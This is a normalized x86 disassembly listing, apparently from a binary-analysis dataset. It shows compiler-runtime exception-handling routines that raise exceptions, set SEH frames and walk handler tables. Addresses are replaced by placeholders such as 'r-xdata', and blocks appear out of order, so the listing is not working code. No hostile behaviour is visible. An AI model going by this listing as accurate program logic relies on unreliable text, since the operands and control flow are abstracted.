mov eax [ ebp + 0x34 ]
pop ecx
push [ eax + 0x18 ]
mov edx [ ebp + 0x34 ]
push [ edx + 0x14 ]
mov ecx [ ebp + 0x34 ]
push [ ecx + 0x10 ]
mov eax [ ebp + 0x34 ]
push [ eax + 0xc ]
mov edx [ ebp + 0x34 ]
push [ edx + 0x8 ]
mov ecx [ ebp + 0x34 ]
push [ ecx + 0x4 ]
mov eax [ ebp + 0x34 ]
push [ eax ]
mov edx [ ebp - 0x30 ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
call RaiseException
mov eax [ rw-data ]
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x28 ] ecx
mov edx [ esi + 0x8 ]
test [ edx + 0xc ] 0x80
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x40 ]
mov ecx [ ebp - 0x30 ]
add ecx 0x52
jmp r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
mov edx [ edx ]
test edx edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov [ ebp + 0xc ] eax
call sub_4015fc
mov eax [ eax + 0x58 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x40 ]
mov edx [ ebp + 0x28 ]
mov [ ebp - 0x3c ] edx
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] ecx
push eax
push 0x3
push 0x1
push 0xeefface
call RaiseException
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push ecx
push ebx
call sub_4d0461
pop ecx
push eax
push ebx
mov edx [ ebp + 0x28 ]
sub edx 0x5
push edx
push 0xb
push 0x1
call sub_4c5ddc
add esp 0x34
push [ ebp - 0x28 ]
push [ ebp + 0x3a ]
push [ ebp + 0x39 ]
push [ ebp + 0x37 ]
push [ ebp + 0x38 ]
push [ ebp + 0x35 ]
push [ ebp + 0xc ]
push [ ebp + 0x28 ]
push 0x8
push [ ebp + 0x28 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x14 ] 0xc
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
mov edx [ ebp - 0x30 ]
add edx 0x52
push edx
call sub_4d0353
mov [ ebp - 0x14 ] 0x0
add esp 0x10
jmp r-xdata
push 0x47b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push eax
push 0xc0000025
push 0xeedfade
mov eax esp
call edx
add esp 0x34
push edx
push 0x0
push 0x0
call eax
add esp 0x8
pop edx
mov ecx [ ebp - 0x34 ]
mov [ rw-data ] ecx
sub_4d0933
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
call sub_4c517c
test ebx ebx
jne r-xdata
mov [ ebp - 0x14 ] 0xc
push 0x1
push [ ebp + 0x14 ]
push ebx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4d0479
mov [ ebp - 0x14 ] 0x0
add esp 0x18
jmp r-xdata
push 0x626
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d09a9
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x44 ] 0x0
je r-xdata
cmp [ ebx + 0x45 ] 0x0
je r-xdata
test [ ebx + 0x1a ] 0x2
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi [ ebx + 0x3c ]
test esi esi
jne r-xdata
mov [ ebx + 0x44 ] 0x0
test [ ebx + 0xc ] 0x4
mov eax [ ebx + 0x14 ]
mov esi [ rw-data ]
lea edx [ ebx + 0x52 ]
jne r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
push 0x667
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov [ rw-data ] esi
movzx ecx [ eax + 0x2c ]
push ecx
push [ eax + 0x28 ]
push eax
push edx
call sub_4d0933
add esp 0x10
mov [ ebx + 0x45 ] 0x0
test [ esi + 0xc ] 0x2
je r-xdata
movzx eax [ esi + 0x2c ]
push eax
push [ esi + 0x28 ]
push esi
push [ ebx + 0x40 ]
call sub_4d0933
add esp 0x10
sub_4d0a37
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push 0x56
call sub_4d01ae
pop ecx
mov ebx eax
call sub_4015fc
mov eax [ eax + 0x48 ]
mov [ ebx ] eax
call sub_4015fc
mov [ eax + 0x48 ] ebx
mov edx [ ebp + 0x10 ]
cmp [ edx + 0x10 ] 0x8
jne r-xdata
test [ esi + 0x4 ] 0x30
jne r-xdata
mov eax esi
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x30 ]
mov [ ebx + 0x14 ] eax
test eax eax
je r-xdata
push 0x71b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
xor ecx ecx
mov ecx [ esi + 0x8 ]
jmp r-xdata
xor edx edx
mov dx [ eax + 0xc ]
jmp r-xdata
xor edx edx
mov edx [ esi + 0x8 ]
mov dx [ edx + 0xc ]
jmp r-xdata
mov [ ebx + 0x14 ] ecx
test esi esi
je r-xdata
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] 0x4
mov [ ebx + 0x10 ] 0x4
test eax eax
je r-xdata
mov [ ebx + 0x1a ] dx
jmp r-xdata
xor eax eax
mov ax [ eax + 0x4 ]
jmp r-xdata
mov [ ebx + 0x1a ] dx
pop edi
pop esi
pop ebx
pop ebp
retn
test [ edi + 0x8 ] 0x80
jne r-xdata
mov [ ebx + 0x18 ] ax
xor edx edx
mov [ ebx + 0x8 ] edx
xor eax eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x2c ] edi
mov [ ebx + 0x1c ] sub_4d0225
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x38 ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x45 ] 0x0
mov [ ebx + 0x44 ] 0x1
mov [ ebx + 0x3c ] esi
test esi esi
mov edx [ ebp + 0x1c ]
mov [ ebx + 0x30 ] edx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ ebx + 0x52 ] eax
je r-xdata
mov [ ebx + 0x45 ] 0x1
mov edx [ ebp + 0x14 ]
lea eax [ ebx + 0x52 ]
mov ecx [ edx ]
add ecx [ ebp + 0x18 ]
mov [ ebx + 0x40 ] ecx
mov edx [ ebx + 0x40 ]
mov eax [ eax ]
mov [ edx ] eax
sub_4d0b59
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov eax [ ebx + 0x28 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov edx [ ebx + 0x2c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
push 0x791
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp [ ebx + 0x45 ] 0x0
je r-xdata
push 0x792
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x3c ] eax
test eax eax
je r-xdata
push 0x794
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test [ edx + 0x8 ] 0x80
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi eax
test [ ecx + 0x8 ] 0x1
sete dl
and edx 0x1
lea ecx [ ebx + 0x52 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
mov [ ebx + 0x45 ] 0x1
mov edx [ ebp + 0x14 ]
mov ecx [ edx ]
add ecx [ ebp + 0x18 ]
mov [ ebx + 0x40 ] ecx
movzx eax [ esi + 0x4 ]
mov edi [ esi ]
mov [ ebp - 0x4 ] eax
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov esi [ esi + 0x8 ]
movzx edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
test [ ebp - 0x4 ] 0x1
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
test [ ebx + 0x18 ] 0x1
je r-xdata
test al 0x30
je r-xdata
push edi
push 0x0
push [ ebx + 0x40 ]
call sub_4c4d44
mov [ ebp - 0xc ] 0x1
add esp 0xc
jmp r-xdata
test al 0x20
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
test al 0x20
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp edi [ ebx + 0x10 ]
je r-xdata
push edi
lea edx [ ebp - 0x8 ]
push edx
push [ ebx + 0x40 ]
call sub_4c4cb0
mov [ ebp - 0xc ] 0x1
add esp 0xc
jmp r-xdata
push esi
push [ ebx + 0x14 ]
call sub_4c5724
add esp 0x8
test eax eax
jne r-xdata
push 0x825
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test al 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x10
je r-xdata
test [ ebp - 0x4 ] 0x3
je r-xdata
push edi
push [ ebp - 0x8 ]
push [ ebx + 0x40 ]
call sub_4c4cb0
add esp 0xc
push 0x867
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ esi + 0xc ] 0x1
je r-xdata
push esi
push [ ebx + 0x14 ]
push [ ebp - 0x8 ]
call sub_4c5ad8
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x1
test [ ebx + 0x18 ] 0x10
jne r-xdata
push 0x804
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov [ ebp - 0xc ] 0x1
test [ ebx + 0xc ] 0x2
je r-xdata
push 0x7f1
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ esi + 0xc ] 0x2
je r-xdata
push edi
push [ ebp - 0x8 ]
push [ ebx + 0x40 ]
call sub_4c4cb0
add esp 0xc
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
push 0x805
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push esi
push [ ebx + 0x14 ]
call sub_4c5724
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebx + 0x44 ] 0x0
movzx ecx [ esi + 0x2c ]
push ecx
push [ esi + 0x28 ]
push esi
push [ ebp - 0x8 ]
call sub_4d0933
add esp 0x10
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ ebp - 0x8 ]
push [ ebx + 0x40 ]
call sub_4d0353
mov [ ebp - 0xc ] 0x1
add esp 0x10
jmp r-xdata
push 0x83f
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebx + 0x40 ]
call sub_4c4cb0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
push esi
push [ ebx + 0x14 ]
push [ ebp - 0x8 ]
call sub_4c5ad8
add esp 0xc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov [ ebp - 0xc ] 0x1
sub_4d0e3b
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x8 ]
movzx ebx [ ecx + 0x10 ]
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx edi [ edx + eax ]
add eax 0x2
mov edx [ ebp - 0x4 ]
movzx edx [ edx + eax ]
mov [ ecx + 0x10 ] di
add eax 0x2
sub edx 0x1
jb r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx + eax + 0x4 ]
mov [ rw-data ] eax
mov [ ecx + 0x12 ] 0x1
push ebx
push ebp
push esi
push edi
mov ecx 0x7b
mov ebx 0x7b
mov ecx [ ebp - 0x8 ]
mov ebx rw-data
call sub_4c5fe7
pop edi
pop esi
pop ebp
pop ebx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x12 ] 0x0
jmp r-xdata
sub edx 0x3
jb r-xdata
mov ebx edi
je r-xdata
call sub_4015fc
add eax 0x48
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ecx ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + eax ]
add eax 0x4
mov eax [ ecx + eax ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
push edx
push eax
call sub_4d176b
add esp 0x10
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x28 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
test esi esi
je r-xdata
mov eax rw-data
test eax eax
je r-xdata
mov [ ebp - 0x10 ] esi
cmp ebx [ esi + 0x30 ]
jne r-xdata
push 0x92a
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp - 0x10 ]
cmp esi [ eax ]
je r-xdata
push 0x959
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
jmp r-xdata
mov edx [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
push esi
call sub_4d09a9
pop ecx
push esi
call [ esi + 0x1c ]
pop ecx
jmp r-xdata
sub_4d0fa9
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edi [ edx + 0x4 ]
test edi edi
jne r-xdata
xor eax eax
test [ edi + 0x4 ] 0x30
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp - 0x4 ] 0x14
push edi
call sub_4c56ec
pop ecx
mov esi eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x9
push rw-data
push ebx
call sub_4c4f48
add esp 0xc
test eax eax
jne r-xdata
add esi 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
add esi 0x9
mov ebx esi
push 0x6
push rw-data
push ebx
call sub_4c4f48
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_4c4e7c
pop ecx
mov ebx eax
sub ebx 0x2
cmp ebx 0xff
jg r-xdata
test [ eax + 0x4 ] 0x2
je r-xdata
push ebx
push esi
lea eax [ ebp - 0x103 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x104 ] bl
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0x18 ]
mov ebx [ ecx ]
test [ eax + 0xc ] 0x80
je r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx - 0x30 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
lea edx [ ebp - 0x104 ]
mov al [ ebp - 0x104 ]
inc eax
push eax
push [ ebx - 0x38 ]
push edx
call sub_4c4f7c
add esp 0xc
test eax eax
je r-xdata
movsx edx [ ebx ]
cmp edx 0x3a
jne r-xdata
movsx eax [ esi ]
cmp eax 0x3a
jne r-xdata
inc ebx
mov esi ebx
inc esi
sub_4d10cc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
push 0x0
push [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_4d0244
add esp 0x14
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
add ebx 0x14
mov eax ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4d1111
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
call sub_4c517c
test [ ebx + 0xc ] 0x2
jne r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
push 0xd01
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov [ ebp - 0x14 ] 0xc
mov [ ebp - 0x14 ] 0x18
test esi esi
je r-xdata
push 0xd02
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test esi esi
jne r-xdata
mov edx [ ebp + 0x18 ]
mov ecx [ edx + 0x1c ]
cmp ecx [ ebx + 0x20 ]
jae r-xdata
test edi edi
jne r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ eax + 0x1c ]
cmp edx [ ebx + 0x24 ]
jae r-xdata
test edi 0x2
jne r-xdata
push 0xd0f
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push esi
movzx edx [ ebx + 0x2c ]
push edx
push [ ebx + 0x28 ]
push edi
push ebx
push [ ebp + 0x8 ]
call sub_4d0479
mov [ ebp - 0x14 ] 0xc
add esp 0x18
jmp r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebx + 0x24 ]
mov ecx [ ebx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x18 ]
sub [ eax + 0x1c ] ecx
sub_4d121c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x18 ]
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
sub ebx 0xc
cmp ebx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
cmp [ ebp + 0x1c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
test [ edx + 0xc ] 0x2
je r-xdata
mov eax [ eax ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push 0x0
push esi
push [ ebp + 0xc ]
push edx
push eax
call sub_4d1267
add esp 0x1c
xor esi esi
sub_4d1267
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x2
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push 0xd9a
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp + 0xc ]
mov ebx [ eax + 0x24 ]
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp ebx esi
ja r-xdata
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4d1111
add esp 0x14
jmp r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
cmp ebx esi
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ebx esi
mov eax [ ebp + 0xc ]
movzx edx [ eax + 0x12 ]
add edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push 0xdd4
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp + 0xc ]
movzx ebx [ edx + 0x10 ]
add ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x10 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
test esi esi
je r-xdata
mov esi [ ebx ]
test [ esi + 0xc ] 0x2
je r-xdata
push 0xdb7
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ecx [ ebp + 0xc ]
movzx edi [ ecx + 0x2e ]
add edi [ ebp + 0xc ]
mov [ ebp - 0x14 ] edi
test [ esi + 0x4 ] 0x1
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x1
test [ esi + 0x5 ] 0x4
je r-xdata
push 0xe4c
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ esi + 0xc ] 0x2
je r-xdata
push 0xe26
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ esi + 0xc ] 0x2
je r-xdata
push 0xdff
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_4d1111
add esp 0x14
jmp r-xdata
push 0xdbb
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ esi + 0xc ] 0x2
jne r-xdata
mov eax [ esi + 0xc ]
mov [ ebp - 0x18 ] eax
mov esi [ esi + 0x8 ]
add [ ebp - 0x8 ] 0xc
jmp r-xdata
mov eax [ esi + 0x24 ]
cmp ebx eax
ja r-xdata
add [ ebp - 0x10 ] 0xc
jmp r-xdata
mov eax [ esi + 0x24 ]
cmp ebx eax
ja r-xdata
mov eax [ ebp - 0x18 ]
imul [ esi + 0x20 ]
cmp ebx eax
jbe r-xdata
push 0xe5a
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebp - 0x8 ]
mov esi [ edx ]
test esi esi
je r-xdata
sub ebx eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x0
push ebx
push [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add edx 0xc
push edx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4d121c
add esp 0x20
cmp [ ebp + 0x18 ] 0x0
je r-xdata
sub ebx eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push ebx
push [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx 0xc
push edx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4d121c
add esp 0x20
jmp r-xdata
mov edx [ edi + 0x4 ]
add edx [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0x18 ] 0x1
test [ eax + 0x5 ] 0x4
je r-xdata
sub ebx eax
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4d121c
add esp 0x20
jmp r-xdata
cmp [ ebp - 0x18 ] 0x1
jbe r-xdata
mov ecx [ eax + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x8 ]
add edi 0x8
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push ebx
push 0x0
push eax
push edx
call sub_4d1267
add esp 0x1c
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ edi ]
push edx
call sub_4d159a
add esp 0x14
jmp r-xdata
mov esi [ edi ]
test esi esi
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x0
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4d121c
add esp 0x20
cmp [ ebp + 0x18 ] 0x0
je r-xdata
xor ebx ebx
sub edi 0x8
cmp edi [ ebp - 0x14 ]
jae r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4d121c
add esp 0x20
jmp r-xdata
sub_4d159a
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
test [ ebx + 0x5 ] 0x4
jne r-xdata
mov eax [ ebx + 0x8 ]
test [ eax + 0xc ] 0x2
jne r-xdata
push 0xeb3
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov edx [ ebx + 0xc ]
mov [ ebp - 0x4 ] edx
mov ebx [ ebx + 0x8 ]
mov edi [ ebx + 0x20 ]
test edi edi
jne r-xdata
push 0xeb4
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push 0xebd
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax [ ebp + 0x10 ]
xor edx edx
div edi
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x4 ]
jbe r-xdata
mov eax edi
imul [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x8 ]
imul edi
sub [ ebp + 0x10 ] eax
cmp edi [ ebp + 0x10 ]
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
imul edx [ ebx ]
add esi edx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push 0xec7
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push 0xec6
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov ecx [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0xffffffff
test ecx ecx
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x10 ]
push 0x0
push ebx
push esi
call sub_4d1267
add esp 0x1c
jmp r-xdata
sub esi [ ebx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push edi
push 0x0
push ebx
push esi
call sub_4d1267
add esp 0x1c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4d16be
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx [ edi ]
test [ ebx + 0x4 ] 0x2
jne r-xdata
mov eax [ ebx + 0xc ]
and eax 0x50
cmp eax 0x50
je r-xdata
push 0xefa
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
cmp [ ebx + 0x8 ] 0xffffffff
jne r-xdata
mov eax esi
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebx + 0x8 ]
add edx esi
mov ebx edx
mov ebx [ ebx ]
jmp r-xdata
mov eax [ ebx - 0xc ]
mov [ edi ] eax
mov eax esi
push 0xf20
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub esi [ ebx - 0x8 ]
sub ebx [ ebx - 0x4 ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_4d1745
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub edx [ eax + 0x8 ]
add edx [ eax + 0x4 ]
cmp [ edx ] 0x1
sete dl
and edx 0x1
mov eax edx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4d176b
push ebp
mov ebp esp
add esp 0xffffffe4
xor eax eax
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
sub [ ebp - 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
test [ edx + 0x5 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x11
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test [ eax + 0x4 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
